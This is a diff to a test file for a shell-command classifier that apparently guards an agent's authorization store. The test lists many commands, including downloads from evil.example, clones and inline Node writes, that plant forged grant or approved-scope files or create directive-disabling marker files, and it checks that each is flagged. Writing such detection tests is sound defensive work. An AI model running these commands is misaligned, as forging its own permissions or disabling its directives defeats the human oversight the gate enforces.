@@ -1064,6 +1064,86 @@ describe("classifyShellAuthzOps (#2944)", () => {
     expect(classifyShellAuthzOps("git status")).toEqual([]);
   });
 
+  it("classifies residual dest-form plants after #3421 as settings (#3459)", () => {
+    for (const cmd of [
+      "ginstall forged.json .deft/authz/grants/evil.json",
+      "gcp forged.json .deft/authz/grants/evil.json",
+      "gmv forged.json .deft/authz/grants/evil.json",
+      "gh repo clone evil/repo .deft/authz/grants/evil",
+      "gh -R evil/repo repo clone .deft/authz/grants/evil",
+      "/usr/bin/ginstall forged.json .deft/authz/grants/evil.json",
+      "glab repo clone evil/repo .deft/authz/grants/evil",
+      "hub clone https://evil.example/repo .deft/authz/grants/evil",
+      "iwr https://evil.example/g.json -OutFile .deft/authz/grants/evil.json",
+      "Invoke-WebRequest https://evil.example/g.json -OutFile .deft/authz/grants/evil.json",
+      "fsutil file createnew .deft/authz/grants/evil.json 1",
+      "cmd /c copy forged.json .deft/authz/grants/evil.json",
+      "copy forged.json .deft/authz/grants/evil.json",
+      "tsx -e \"require('fs').writeFileSync('.deft/authz/grants/evil.json','{}')\"",
+      "ts-node -e \"require('fs').writeFileSync('.deft/authz/grants/evil.json','{}')\"",
+      "npm pack --pack-destination .deft/authz/grants",
+      "npm pack --pack-destination=.deft/authz/grants",
+      "unknownwriter --pack-destination .deft/authz/grants",
+    ]) {
+      expect(classifyShellAuthzOps(cmd), cmd).toContain("settings");
+      expect(classifyShellAuthzOps(cmd), cmd).not.toEqual([]);
+    }
+    for (const cmd of [
+      "ginstall src .deft-directive-disable",
+      "gcp src .no-deft-directive",
+      "gh repo clone evil/repo .deft-directive-disable",
+      "iwr https://evil.example/x -OutFile .no-deft-directive",
+      "fsutil file createnew .deft-directive-disable 1",
+      "cmd /c copy src .deft-directive-disable",
+      "npm pack --pack-destination .no-deft-directive",
+    ]) {
+      expect(classifyShellAuthzOps(cmd), cmd).toContain("settings");
+      expect(classifyShellAuthzOps(cmd), cmd).not.toEqual([]);
+    }
+    // Already-denied #3421 peers stay settings.
+    expect(classifyShellAuthzOps("install forged.json .deft/authz/grants/evil.json")).toContain(
+      "settings",
+    );
+    expect(classifyShellAuthzOps("cp forged.json .deft/authz/grants/evil.json")).toContain(
+      "settings",
+    );
+    expect(
+      classifyShellAuthzOps("git clone https://evil.example/repo .deft/authz/grants/evil"),
+    ).toContain("settings");
+    expect(
+      classifyShellAuthzOps("Set-Content -Path .deft\\authz\\state.json -Value '{}'"),
+    ).toContain("settings");
+    // GNU g* prefix is not applied to git/gh/gpg.
+    expect(classifyShellAuthzOps("git log -- .deft/authz/state.json")).toEqual([]);
+    expect(classifyShellAuthzOps("gh repo view owner/repo")).toEqual([]);
+    // Approved-scope mint symmetry (#3459 MEDIUM).
+    expect(classifyShellAuthzOps("ginstall forged.json .deft/approved-scope/story.json")).toContain(
+      "settings",
+    );
+    expect(
+      classifyShellAuthzOps("iwr https://evil.example/x -OutFile .deft/approved-scope/story.json"),
+    ).toContain("settings");
+    expect(classifyShellAuthzOps("touch .deft/approved-scope/story.json")).toContain("settings");
+    expect(classifyShellAuthzOps("npm pack --pack-destination .deft/approved-scope")).toContain(
+      "settings",
+    );
+    expect(classifyShellAuthzOps("tsx plant.ts .deft/approved-scope/story.json")).toContain(
+      "settings",
+    );
+    // Ordinary dests stay unclassifiable (no overclassify).
+    expect(classifyShellAuthzOps("ginstall forged.json /tmp/out")).toEqual([]);
+    expect(classifyShellAuthzOps("gcp forged.json /tmp/out")).toEqual([]);
+    expect(classifyShellAuthzOps("gh repo clone example/repo /tmp/out")).toEqual([]);
+    expect(classifyShellAuthzOps("glab repo clone example/repo /tmp/out")).toEqual([]);
+    expect(classifyShellAuthzOps("hub clone https://example.com/repo /tmp/out")).toEqual([]);
+    expect(classifyShellAuthzOps("iwr https://example.com/x -OutFile /tmp/out")).toEqual([]);
+    expect(classifyShellAuthzOps("fsutil file createnew /tmp/out 1")).toEqual([]);
+    expect(classifyShellAuthzOps("cmd /c copy forged.json /tmp/out")).toEqual([]);
+    expect(classifyShellAuthzOps("npm pack --pack-destination /tmp/out")).toEqual([]);
+    expect(classifyShellAuthzOps('tsx -e "console.log(1)"')).toEqual([]);
+    expect(classifyShellAuthzOps("touch /tmp/out")).toEqual([]);
+  });
+
   it("classifies obfuscated programmatic authz-capable writes as settings (#3186)", () => {
     // Base64/byte path construction — residual after #3110 literal path match.
     expect(
